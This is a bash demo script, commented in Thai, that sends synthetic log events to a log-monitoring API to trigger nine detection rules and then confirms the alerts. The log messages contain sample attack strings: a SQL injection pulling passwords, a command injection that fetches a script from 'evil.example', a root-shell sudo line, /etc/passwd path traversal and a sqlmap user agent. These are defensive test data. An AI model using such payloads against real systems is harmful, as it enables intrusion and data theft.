#!/usr/bin/env bash
# Demo: ยิง log ให้โดน rule ครบทั้ง 9 ข้อใน detection/rules/security_rules.yaml ทีละข้อ แล้วตรวจว่า alert ขึ้นจริง
# ใช้อัดคลิปตอนทดสอบ — มีหยุดระหว่างข้อให้สลับไปดูหน้า Alerts บน dashboard ทัน
#
# ใช้: ./scripts/demo-all-rules.sh <INGESTOR_TOKEN>
#   API=…           (ค่าเริ่มต้น http://localhost:3000/api/v1 · cloud: https://logchain-api.nareubad.work/api/v1)
#   READ_TOKEN=…    token ที่มี role analyst ขึ้นไป — ใช้ตรวจผลผ่าน GET /alerts
#                   ไม่ใส่ = ตรวจจาก DB ตรงด้วย `docker exec logchain-postgres` (รันบนเครื่องที่มี stack)
#   PAUSE=4         วินาทีที่หยุดหลังแต่ละข้อ · STEP=1 = กด Enter ทีละข้อแทน
#
# ข้อความแต่ละข้อเลือกให้โดน rule ที่ตั้งใจเป็นตัวแรก (engine คืน rule แรกที่ match ตามลำดับในไฟล์)
# และผ่าน PII masking ของ backend แล้วยังโดนอยู่ · source ใหม่ทุกรอบ (rule-demo-<เวลา>)
# ให้ได้ alert ใหม่ ไม่ถูก dedup เข้ากับ alert ที่ค้าง OPEN จากรอบก่อน
set -euo pipefail
TOKEN="${1:-${TOKEN:-}}"
API="${API:-http://localhost:3000/api/v1}"
PAUSE="${PAUSE:-4}"
STEP="${STEP:-0}"
SRC="rule-demo-$(date +%H%M%S)"
IP="203.0.113.77"
[ -n "$TOKEN" ] || { echo "ต้องใส่ token ของ log-ingestor (ดู next-steps.md 'คำสั่งที่ใช้บ่อย')" >&2; exit 2; }

if [ -n "${READ_TOKEN:-}" ]; then VERIFY=api
elif docker inspect logchain-postgres >/dev/null 2>&1; then VERIFY=db
else VERIFY=none; fi

send() { # <eventType> <cdeScope> <severity> <message>
  local body
  body=$(jq -nc --arg s "$SRC" --arg ip "$IP" --arg et "$1" --argjson cde "$2" --arg sev "$3" --arg m "$4" \
    '{source:$s, sourceIp:$ip, eventType:$et, cdeScope:$cde, severity:$sev, message:$m}')
  curl -s -o /dev/null -w "%{http_code}" -X POST \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "$body" "$API/logs"
}

alerts_now() { # พิมพ์ "rule_id occurrence_count" ของ alert ที่ source = $SRC
  case "$VERIFY" in
    api) curl -sf -H "Authorization: Bearer $READ_TOKEN" "$API/alerts" \
           | jq -r --arg s "$SRC" '.[] | select(.source == $s and .alertType == "RULE_MATCH") | "\(.ruleId) \(.occurrenceCount)"' ;;
    db)  docker exec logchain-postgres psql -U logchain -d logchain -tA -F' ' \
           -c "select rule_id, occurrence_count from alerts where source = '$SRC' and alert_type = 'RULE_MATCH'" ;;
  esac
}

wait_alert() { # <rule_id> — รอ alert ขึ้นไม่เกิน 30 วิ
  [ "$VERIFY" = none ] && { echo "   (ตรวจผลอัตโนมัติไม่ได้ — ดูหน้า Alerts บน dashboard)"; return 0; }
  for _ in $(seq 1 30); do
    if alerts_now | awk -v r="$1" '$1 == r { found = 1 } END { exit !found }'; then
      echo "   ✓ alert rule $1 ขึ้นแล้ว"; return 0
    fi
    sleep 1
  done
  echo "   ✗ ไม่เห็น alert rule $1 ภายใน 30 วิ"; return 1
}

pause() {
  if [ "$STEP" = 1 ]; then read -rp "   [Enter] ข้อต่อไป " _; else sleep "$PAUSE"; fi
}

FAILED=()
run() { # <rule_id> <หัวข้อ> <eventType> <cdeScope> <severity> <message> [จำนวนครั้ง]
  local rid="$1" title="$2" et="$3" cde="$4" sev="$5" msg="$6" n="${7:-1}" codes=""
  echo
  echo "▶ rule $rid — $title"
  local times=""; if [ "$n" -gt 1 ]; then times=" × $n"; fi
  echo "   eventType=$et cdeScope=$cde · \"$msg\"$times"
  for _ in $(seq 1 "$n"); do
    codes+="$(send "$et" "$cde" "$sev" "$msg") "
    if [ "$n" -gt 1 ]; then sleep 1; fi
  done
  echo "   HTTP: $codes"
  wait_alert "$rid" || FAILED+=("$rid")
  pause
}

echo "source ของรอบนี้: $SRC · API: $API · ตรวจผล: $VERIFY"

echo
echo "▶ กลุ่มควบคุม — log ปกติ ต้องไม่มี alert"
echo "   HTTP: $(send USER_ACTIVITY false INFO "user jdoe opened the reports page")"
pause

run 5710  "Brute force (5 ครั้งใน 60 วิ)"            AUTH_FAILURE false WARNING  "authentication failed for user jdoe - invalid credentials" 6
run 5715  "Login สำเร็จหลังล้มเหลวหลายครั้ง"           AUTH_SUCCESS false INFO     "login success for user jdoe from $IP"
run 5820  "Privilege escalation"                      PRIV_ESC     false WARNING  "user jdoe ran sudo -u root /bin/bash outside change window"
run 31100 "SQL injection"                             WEB_REQUEST  false WARNING  "GET /products?id=5 UNION SELECT username,password FROM users"
run 31151 "Command injection"                         WEB_REQUEST  false WARNING  "GET /ping?host=8.8.8.8; wget http://evil.example/x.sh"
run 90001 "ข้อมูลบัตรนอก CDE (เลขบัตรถูก mask เป็น [PAN])" DATA_ACCESS  false WARNING  "report export contains card number 4111 1111 1111 1111 for customer 1002"
run 90002 "การเข้าถึงข้อมูลบัตรใน CDE"                  CARD_ACCESS  true  INFO     "tokenised record read by billing service for settlement"
run 60001 "Scanner / user agent น่าสงสัย"               WEB_REQUEST  false INFO     "GET /admin HTTP/1.1 User-Agent: sqlmap/1.7.2#stable"
run 60002 "Path traversal"                            WEB_REQUEST  false WARNING  "GET /download?file=../etc/passwd"

echo
if [ "$VERIFY" != none ]; then
  echo "สรุป alert ของ $SRC (rule_id occurrence_count):"
  alerts_now | sort -n | sed 's/^/   /'
  CTRL=$(alerts_now | wc -l)
  [ "$CTRL" -eq 9 ] || echo "   ⚠ ได้ $CTRL alert (คาด 9 — กลุ่มควบคุมต้องไม่มี)"
fi
if [ ${#FAILED[@]} -gt 0 ]; then
  echo "✗ ไม่ผ่าน: ${FAILED[*]}"; exit 1
fi
echo "✓ ครบ 9 rule"
